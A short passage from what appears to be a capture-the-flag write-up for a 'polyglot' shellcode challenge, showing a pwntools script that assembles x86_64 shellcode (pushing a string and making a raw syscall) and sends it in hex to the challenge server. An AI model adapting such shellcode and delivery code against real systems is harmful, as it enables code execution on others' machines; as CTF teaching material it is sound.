## Monoglot
First thing's first, let's write shellcode that works on one system. Let's perhaps start with x86_64, since I've touched that enough times recently to remember it

````python
context.arch = "amd64"

hex = asm(shellcraft.pushstr(b"Battelle\x00") + 
    shellcraft.syscall(237, 38085, "rsp")).hex()

from pwn import *

conn = remote("20NYKwrUxmss5njum.polyglot.challs.pwnoh.io", 1337, ssl=True)
conn.recvuntilS("(in hex):")
conn.sendline(hex)
print(conn.recvallS())
````
